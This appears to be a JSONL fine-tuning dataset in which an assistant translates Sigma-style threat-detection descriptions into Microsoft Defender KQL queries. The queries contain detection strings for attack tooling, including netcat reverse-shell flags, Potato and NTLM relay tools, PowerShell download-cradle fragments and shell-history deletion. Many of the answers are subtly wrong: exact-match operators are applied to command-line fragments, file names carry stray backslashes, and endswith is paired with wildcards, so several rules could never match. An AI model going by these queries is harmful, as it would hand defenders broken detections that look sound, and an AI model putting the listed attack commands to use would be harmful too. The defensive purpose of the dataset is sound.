{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session). Topic: proc_creation_win_winrm_remote_powershell_session_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\wsmprovhost.exe\" or InitiatingProcessFolderPath endswith \"\\\\wsmprovhost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects enumeration of local or remote network services. Topic: proc_creation_macos_network_service_scanning"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFolderPath in~ (\"/nc\", \"/netcat\")) and (not(ProcessCommandLine =~ \"l\"))) or (InitiatingProcessFolderPath in~ (\"/nmap\", \"/telnet\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects new process creation using WMIC via the \"process call create\" flag Topic: proc_creation_win_wmic_process_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"process\", \"call\", \"create\")) and (FolderPath endswith \"\\\\wmic.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child processes of \"GoogleUpdate.exe\" Topic: proc_creation_win_googleupdate_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\GoogleUpdate.exe\" and (not((isnull(FolderPath) or (FolderPath contains \"\\\\Google\" or (FolderPath endswith \"\\\\setup.exe\" or FolderPath endswith \"chrome_updater.exe\" or FolderPath endswith \"chrome_installer.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects different hacktools used for relay attacks on Windows for privilege escalation Topic: proc_creation_win_hktl_relay_attacks_tools"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine has_all (\".exe -c \\\"{\") and ProcessCommandLine endswith \"}\\\" -z\") or (FolderPath contains \"PetitPotam\" or FolderPath contains \"RottenPotato\" or FolderPath contains \"HotPotato\" or FolderPath contains \"JuicyPotato\" or FolderPath contains \"\\\\just_dce_\" or FolderPath contains \"Juicy Potato\" or FolderPath contains \"\\\\temp\\\\rot.exe\" or FolderPath contains \"\\\\Potato.exe\" or FolderPath contains \"\\\\SpoolSample.exe\" or FolderPath contains \"\\\\Responder.exe\" or FolderPath contains \"\\\\smbrelayx\" or FolderPath contains \"\\\\ntlmrelayx\" or FolderPath contains \"\\\\LocalPotato\") or (ProcessCommandLine in~ (\"Invoke-Tater\", \" smbrelay\", \" ntlmrelay\", \"cme smb \", \" /ntlm:NTLMhash \", \"Invoke-PetitPotam\") or (ProcessCommandLine contains \".exe -t \" and ProcessCommandLine contains \" -p \"))) and (not((FolderPath contains \"HotPotatoes6\" or FolderPath contains \"HotPotatoes7\" or FolderPath contains \"HotPotatoes \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques. Topic: proc_creation_win_uac_bypass_sdclt"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessIntegrityLevel in~ (\"High\", \"S-1-16-12288\")) and InitiatingProcessFolderPath =~ \"sdclt.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Gpg4win to encrypt/decrypt files located in potentially suspicious locations. Topic: proc_creation_win_gpg4win_susp_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"-passphrase\" and ((FolderPath endswith \"\\\\gpg.exe\" or FolderPath endswith \"\\\\gpg2.exe\") or ProcessVersionInfoProductName =~ \"GNU Privacy Guard (GnuPG)\" or ProcessVersionInfoFileDescription =~ \"GnuPG\u2019s OpenPGP tool\") and (ProcessCommandLine in~ (\":\\\\PerfLogs\\\\\", \":\\\\Temp\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon child process of Setres.EXE.\nSetres.EXE is a Windows server only process and tool that can be used to set the screen resolution.\nIt can potentially be abused in order to launch any arbitrary file with a name containing the word \"choice\" from the current execution path.\n Topic: proc_creation_win_setres_uncommon_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"\\\\choice\" and InitiatingProcessFileName =~ \"\\\\setres.exe\") and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\choice.exe\", \"C:\\\\Windows\\\\SysWOW64\\\\choice.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects events in which a history file gets deleted, e.g. the ~/bash_history to remove traces of malicious activity Topic: proc_creation_lnx_susp_history_delete"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"/rm\", \"/unlink\", \"/shred\")) and ((ProcessCommandLine contains \"/.bash_history\" or ProcessCommandLine contains \"/.zsh_history\") or (ProcessCommandLine endswith \"_history\" or ProcessCommandLine endswith \".history\" or ProcessCommandLine endswith \"zhistory\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of a renamed autohotkey.exe binary based on PE metadata fields Topic: proc_creation_win_renamed_autohotkey"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoProductName contains \"AutoHotkey\" or ProcessVersionInfoFileDescription contains \"AutoHotkey\" or (ProcessVersionInfoOriginalFileName in~ (\"AutoHotkey.exe\", \"AutoHotkey.rc\"))) and (not(((FolderPath endswith \"\\\\AutoHotkey.exe\" or FolderPath endswith \"\\\\AutoHotkey32.exe\" or FolderPath endswith \"\\\\AutoHotkey32_UIA.exe\" or FolderPath endswith \"\\\\AutoHotkey64.exe\" or FolderPath endswith \"\\\\AutoHotkey64_UIA.exe\" or FolderPath endswith \"\\\\AutoHotkeyA32.exe\" or FolderPath endswith \"\\\\AutoHotkeyA32_UIA.exe\" or FolderPath endswith \"\\\\AutoHotkeyU32.exe\" or FolderPath endswith \"\\\\AutoHotkeyU32_UIA.exe\" or FolderPath endswith \"\\\\AutoHotkeyU64.exe\" or FolderPath endswith \"\\\\AutoHotkeyU64_UIA.exe\") or FolderPath contains \"\\\\AutoHotkey\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects piping the password to an anydesk instance via CMD and the --set-password flag. Topic: proc_creation_win_remote_access_tools_anydesk_piped_password_via_cli"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"/c \", \"echo \", \".exe --set-password\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of wmic with the \"qfe\" flag in order to obtain information about installed hotfix updates on the system. This is often used by pentester and attacker enumeration scripts Topic: proc_creation_win_wmic_recon_hotfix"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" qfe\" and (ProcessVersionInfoOriginalFileName =~ \"wmic.exe\" or FolderPath endswith \"\\\\WMIC.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"cloudflared\" tool to connect back to a tunnel. This was seen used by threat actors to maintain persistence and remote access to compromised networks. Topic: proc_creation_win_cloudflared_tunnel_run"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"-config \", \"-credentials-contents \", \"-credentials-file \", \"-token \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in.\nWinlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.\n Topic: registry_set_winlogon_notify_key"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\\\logon\" and RegistryValueData endswith \".dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible Sysmon filter driver unloaded via fltmc.exe Topic: proc_creation_win_fltmc_unload_driver_sysmon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"unload\", \"sysmon\")) and (FolderPath endswith \"\\\\fltMC.exe\" or ProcessVersionInfoOriginalFileName =~ \"fltMC.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an interactive AT job, which may be used as a form of privilege escalation. Topic: proc_creation_win_at_interactive_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"interactive\" and InitiatingProcessFolderPath =~ \"\\\\at.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process tree behavior of a \"rundll32\" execution often linked with potential Qakbot activity. Topic: proc_creation_win_malware_qakbot_rundll32_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \".dll\" and ((InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\curl.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\")) and (ProcessCommandLine in~ (\":\\\\ProgramData\\\\\", \":\\\\Users\\\\Public\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of SoftPerfects \"netscan.exe\". An application for scanning networks.\nIt is actively used in-the-wild by threat actors to inspect and understand the network architecture of a victim.\n Topic: proc_creation_win_pua_netscan"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\netscan.exe\" or ProcessVersionInfoProductName =~ \"Network Scanner\" or ProcessVersionInfoFileDescription =~ \"Application for scanning networks\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the registry values related to outlook security settings Topic: registry_set_office_outlook_security_settings"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Office*\" and RegistryKey endswith \"\\\\Outlook\\\\Security*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects use of .NET InstallUtil.exe in order to download arbitrary files. The files will be written to \"%LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE\\\"\n Topic: proc_creation_win_installutil_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"ftp://\", \"http://\", \"https://\")) and (FolderPath endswith \"\\\\InstallUtil.exe\" or ProcessVersionInfoOriginalFileName =~ \"InstallUtil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"lodctr.exe\" to rebuild the performance counter registry values. This can be abused by attackers by providing a malicious config file to overwrite performance counter configuration to confuse and evade monitoring and security solutions. Topic: proc_creation_win_lodctr_performance_counter_tampering"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -r\" or ProcessCommandLine contains \" /r\" or ProcessCommandLine contains \" \u2013r\" or ProcessCommandLine contains \" \u2014r\" or ProcessCommandLine contains \" \u2015r\") and (ProcessVersionInfoOriginalFileName =~ \"LODCTR.EXE\" and InitiatingProcessFolderPath =~ \"\\\\lodctr.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detection of sc.exe utility adding a new service with special permission which hides that service. Topic: proc_creation_win_sc_sdset_modification"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"sdset\" and (FolderPath endswith \"\\\\sc.exe\" or ProcessVersionInfoOriginalFileName =~ \"sc.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects setting of a new registry database value related to BgInfo configuration. Attackers can for example set this value to save the results of the commands executed by BgInfo in order to exfiltrate information. Topic: registry_set_bginfo_custom_db"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"RegistryValueSet\" and RegistryKey endswith \"\\\\Software\\\\Winternals\\\\BGInfo\\\\Database\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity Topic: proc_creation_win_mshta_inline_vbscript"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"Wscript.\", \".Shell\", \".Run\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious execution of the Regasm/Regsvcs utilities from a potentially suspicious location Topic: proc_creation_win_regasm_regsvcs_uncommon_location_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\", \"\\\\PerfLogs\\\\\", \"\\\\Users\\\\Public\\\\\", \"\\\\Windows\\\\Temp\\\\\")) and ((FolderPath endswith \"\\\\Regsvcs.exe\" or FolderPath endswith \"\\\\Regasm.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"RegSvcs.exe\", \"RegAsm.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects WMI modules being loaded by an uncommon process Topic: image_load_wmi_module_load_by_uncommon_process"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\fastprox.dll\" or FolderPath endswith \"\\\\wbemcomn.dll\" or FolderPath endswith \"\\\\wbemprox.dll\" or FolderPath endswith \"\\\\wbemsvc.dll\" or FolderPath endswith \"\\\\WmiApRpl.dll\" or FolderPath endswith \"\\\\wmiclnt.dll\" or FolderPath endswith \"\\\\WMINet_Utils.dll\" or FolderPath endswith \"\\\\wmiprov.dll\" or FolderPath endswith \"\\\\wmiutils.dll\") and (not((InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\explorer.exe\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\System32\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\SysWOW64\\\\\"))) and (not((InitiatingProcessFolderPath =~ \"\\\\MsMpEng.exe\" or (InitiatingProcessFolderPath in~ (\"\\\\WindowsAzureGuestAgent.exe\", \"\\\\WaAppAgent.exe\")) or (InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\Sysmon.exe\", \":\\\\Windows\\\\Sysmon64.exe\")) or (InitiatingProcessFolderPath contains \"\\\\Microsoft\\\\Teams\\\\current\\\\Teams.exe\" or InitiatingProcessFolderPath contains \"\\\\Microsoft\\\\Teams\\\\Update.exe\") or (InitiatingProcessFolderPath in~ (\"\\\\thor.exe\", \"\\\\thor64.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"VSDiagnostics.exe\" with the \"start\" command in order to launch and proxy arbitrary binaries. Topic: proc_creation_win_vsdiagnostics_execution_proxy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /launch:\", \" -launch:\")) and ProcessCommandLine =~ \"start\" and (FolderPath endswith \"\\\\VSDiagnostics.exe\" or ProcessVersionInfoOriginalFileName =~ \"VSDiagnostics.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects WMI command line event consumers Topic: image_load_wmi_persistence_commandline_event_consumer"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\" and FolderPath endswith \"\\\\wbemcons.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in Topic: proc_creation_win_uac_bypass_hijacking_firwall_snap_in"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine =~ \"WF.msc\" and InitiatingProcessFileName =~ \"\\\\mmc.exe\") and (not(InitiatingProcessFolderPath =~ \"\\\\WerFault.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry keys related to Ursnif malware. Topic: registry_add_malware_ursnif"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"RegistryKeyCreated\" and RegistryKey endswith \"\\\\Software\\\\AppDataLow\\\\Software\\\\Microsoft*\") and (not((RegistryKey endswith \"\\\\SOFTWARE\\\\AppDataLow\\\\Software\\\\Microsoft\\\\Internet Explorer*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\AppDataLow\\\\Software\\\\Microsoft\\\\RepService*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\AppDataLow\\\\Software\\\\Microsoft\\\\IME*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\AppDataLow\\\\Software\\\\Microsoft\\\\Edge*\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects child processes of \"provlaunch.exe\" which might indicate potential abuse to proxy execution. Topic: proc_creation_win_provlaunch_potential_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\provlaunch.exe\" and (not(((FolderPath endswith \"\\\\calc.exe\" or FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\notepad.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (FolderPath contains \":\\\\PerfLogs\\\\\" or FolderPath contains \":\\\\Temp\\\\\" or FolderPath contains \":\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\AppData\\\\Temp\\\\\" or FolderPath contains \"\\\\Windows\\\\System32\\\\Tasks\\\\\" or FolderPath contains \"\\\\Windows\\\\Tasks\\\\\" or FolderPath contains \"\\\\Windows\\\\Temp\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe Topic: proc_creation_win_vaultcmd_list_creds"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/listcreds:\" and (FolderPath endswith \"\\\\VaultCmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"VAULTCMD.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential RDP Session Hijacking activity on Windows systems Topic: proc_creation_win_tscon_rdp_session_hijacking"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\tscon.exe\" or ProcessVersionInfoOriginalFileName =~ \"tscon.exe\") and (InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects LOLBINs executing from an abnormal or uncommon drive such as a mounted ISO. Topic: proc_creation_win_susp_lolbin_exec_from_non_c_drive"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\calc.exe\" or FolderPath endswith \"\\\\certutil.exe\" or FolderPath endswith \"\\\\cmstp.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\installutil.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"CALC.EXE\", \"CertUtil.exe\", \"CMSTP.EXE\", \"cscript.exe\", \"installutil.exe\", \"MSHTA.EXE\", \"REGSVR32.EXE\", \"RUNDLL32.EXE\", \"wscript.exe\"))) and (not((InitiatingProcessFolderPath =~ \"C:\\\\\" or InitiatingProcessFolderPath =~ \"\" or isnull(InitiatingProcessFolderPath))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "In Kasperskys 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents. Topic: proc_creation_win_pua_mouselock_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoProductName contains \"Mouse Lock\" or ProcessVersionInfoCompanyName contains \"Misc314\" or ProcessCommandLine contains \"Mouse Lock_\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the registration of a new ODBC driver. Topic: registry_set_odbc_driver_registered"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\ODBC\\\\ODBCINST.INI*\" and RegistryKey endswith \"\\\\Driver\") and (not((RegistryKey endswith \"\\\\SQL Server*\" and RegistryValueData =~ \"%WINDIR%\\\\System32\\\\SQLSRV32.dll\"))) and (not(((RegistryKey contains \"\\\\Microsoft Access \" and RegistryValueData startswith \"C:\\\\Progra\" and RegistryValueData endswith \"\\\\ACEODBC.DLL\") or (RegistryKey contains \"\\\\Microsoft Excel Driver\" and RegistryValueData startswith \"C:\\\\Progra\" and RegistryValueData endswith \"\\\\ACEODBC.DLL\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of NirCmd tool for command execution as SYSTEM user Topic: proc_creation_win_pua_nircmd_as_system"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" runassystem \""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"odbcconf\" where the path of the DLL being registered is located in a potentially suspicious location. Topic: proc_creation_win_odbcconf_exec_susp_locations"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\":\\\\PerfLogs\\\\\", \":\\\\ProgramData\\\\\", \":\\\\Temp\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\Registration\\\\CRMLog\", \":\\\\Windows\\\\System32\\\\com\\\\dmp\\\\\", \":\\\\Windows\\\\System32\\\\FxsTmp\\\\\", \":\\\\Windows\\\\System32\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\\", \":\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\\", \":\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\\", \":\\\\Windows\\\\System32\\\\spool\\\\SERVERS\\\\\", \":\\\\Windows\\\\System32\\\\Tasks_Migrated\\\\\", \":\\\\Windows\\\\System32\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\\", \":\\\\Windows\\\\SysWOW64\\\\com\\\\dmp\\\\\", \":\\\\Windows\\\\SysWOW64\\\\FxsTmp\\\\\", \":\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\\", \":\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\\", \":\\\\Windows\\\\Tasks\\\\\", \":\\\\Windows\\\\Temp\\\\\", \":\\\\Windows\\\\Tracing\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\")) and (FolderPath endswith \"\\\\odbcconf.exe\" or ProcessVersionInfoOriginalFileName =~ \"odbcconf.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of programs as Launch Agents or Launch Daemons using launchctl on macOS. Topic: proc_creation_macos_launchctl_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"submit\", \"load\", \"start\")) and InitiatingProcessFolderPath =~ \"/launchctl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of system utilities (only grep for now) to discover security software discovery Topic: proc_creation_macos_security_software_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath =~ \"/usr/bin/grep\" and ((ProcessCommandLine in~ (\"nessusd\", \"santad\", \"CbDefense\", \"falcond\", \"td-agent\", \"packetbeat\", \"filebeat\", \"auditbeat\", \"osqueryd\", \"BlockBlock\", \"LuLu\")) or (ProcessCommandLine in~ (\"Little\", \"Snitch\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tools and process executions used by Greenbug in their May 2020 campaign as reported by Symantec Topic: proc_creation_win_apt_greenbug_may20"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\":\\\\ProgramData\\\\adobe\\\\Adobe.exe\", \":\\\\ProgramData\\\\oracle\\\\local.exe\", \"\\\\revshell.exe\", \"\\\\infopagesbackup\\\\ncat.exe\", \":\\\\ProgramData\\\\comms\\\\comms.exe\")) or (ProcessCommandLine in~ (\"-ExecutionPolicy Bypass -File\", \"\\\\msf.ps1\")) or (ProcessCommandLine in~ (\"infopagesbackup\", \"\\\\ncat\", \"-e cmd.exe\")) or ProcessCommandLine =~ \"L3NlcnZlcj1\" or (ProcessCommandLine in~ (\"system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill\", \"-nop -w hidden -c $k=new-object\", \"[Net.CredentialCache]::DefaultCredentials;IEX \", \" -nop -w hidden -c $m=new-object net.webclient;$m\", \"-noninteractive -executionpolicy bypass whoami\", \"-noninteractive -executionpolicy bypass netstat -a\"))"}]}
